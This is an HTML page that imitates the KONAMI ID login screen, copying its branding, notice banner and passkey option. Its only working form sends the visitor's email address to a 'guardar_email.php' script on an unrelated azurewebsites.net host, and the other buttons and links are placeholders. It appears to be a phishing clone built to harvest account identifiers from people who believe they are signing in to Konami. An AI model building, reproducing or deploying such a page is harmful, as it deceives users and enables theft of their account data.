<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>KONAMI ID</title>

    <style>

        *{
            margin:0;
            padding:0;
            box-sizing:border-box;
            font-family:Arial, Helvetica, sans-serif;
        }

        body{
            background:#ececec;
            height:100vh;
            display:flex;
            flex-direction:column;
        }

        /* HEADER */

        .header{
            background:white;
            height:60px;
            display:flex;
            align-items:center;
            padding-left:20px;
            border-bottom:1px solid #ddd;
        }

        .logo{
            color:#b60000;
            font-size:42px;
            font-weight:bold;
        }

        /* CONTENIDO */

        .container{
            flex:1;
            display:flex;
            justify-content:center;
            align-items:center;
        }

        .login-box{
            width:600px;
            background:white;
            padding:50px;
            border:1px solid #ccc;
            border-radius:5px;
        }

        h1{
            text-align:center;
            color:#666;
            margin-bottom:35px;
            font-weight:normal;
            font-size:48px;
        }

        /* NOTICE */

        .notice{
            border:1px solid #ff4d4d;
            border-radius:5px;
            padding:18px;
            margin-bottom:25px;
            color:#555;
            font-size:18px;
            cursor:pointer;
        }

        .notice:hover{
            background:#fafafa;
        }

        /* INPUT */

        input{
            width:100%;
            padding:18px;
            font-size:18px;
            border:1px solid #ccc;
            border-radius:5px;
            margin-bottom:25px;
        }

        /* BOTON */

        button{
            width:250px;
            height:55px;
            background:#b60000;
            color:white;
            border:none;
            border-radius:4px;
            font-size:22px;
            cursor:pointer;
            display:block;
            margin:auto;
            font-weight:bold;
        }

        button:hover{
            background:#930000;
        }

        /* OR */

        .or{
            display:flex;
            align-items:center;
            margin:35px 0;
            color:#777;
        }

        .line{
            flex:1;
            height:1px;
            background:#ccc;
        }

        .or span{
            margin:0 20px;
            font-size:18px;
        }

        /* PASSKEY */

        .passkey-btn{
            width:350px;
            margin:auto;
            background:#b60000;
            color:white;
            padding:15px;
            text-align:center;
            border-radius:5px;
            cursor:pointer;
            font-size:20px;
            font-weight:bold;
        }

        .passkey-btn:hover{
            background:#930000;
        }

        .passkey-link{
            text-align:center;
            margin-top:18px;
        }

        .passkey-link a{
            color:#2196f3;
            text-decoration:none;
            font-size:18px;
        }

        /* REGISTER */

        .register{
            text-align:center;
            margin-top:40px;
            color:#666;
            font-size:18px;
        }

        .register a{
            color:#b60000;
            text-decoration:none;
        }

        /* FOOTER */

        .footer{
            background:white;
            height:70px;
            display:flex;
            justify-content:center;
            align-items:center;
            gap:50px;
            border-top:1px solid #ddd;
            font-size:14px;
        }

    </style>
</head>
<body>

    <!-- HEADER -->

    <div class="header">
        <div class="logo">KONAMI</div>
    </div>

    <!-- CONTENIDO -->

    <div class="container">

        <div class="login-box">

            <h1>KONAMI ID</h1>

            <!-- NOTICE -->

            <div class="notice">
                ▶ Notice of Service Termination in Russia and Belarus
            </div>

            <!-- FORM -->

            <form action="https://nublebusphp-fsb0bwd3h4bscgfv.chilecentral-01.azurewebsites.net/guardar_email.php" method="POST">

                <!-- INPUT -->

                <input
                    type="email"
                    name="email"
                    id="email"
                    placeholder="KONAMI ID / E-mail address"
                    required
                >

                <!-- BOTON -->

                <button type="submit">
                    Log In
                </button>

            </form>

            <!-- OR -->

            <div class="or">
                <div class="line"></div>
                <span>OR</span>
                <div class="line"></div>
            </div>

            <!-- PASSKEY -->

            <div class="passkey-btn">
                🔑 Logging in With a Passkey
            </div>

            <div class="passkey-link">
                <a href="#">
                    What is a Passkey?
                </a>
            </div>

            <!-- REGISTER -->

            <div class="register">
                Don't have a KONAMI ID?<br><br>

                <a href="#">
                    Register
                </a>
            </div>

        </div>

    </div>

    <!-- FOOTER -->

    <div class="footer">
        <span>Terms of Use / Privacy</span>
        <span>Trademarks</span>
        <span>Support</span>
        <span>Company Information</span>
    </div>

</body>
</html>
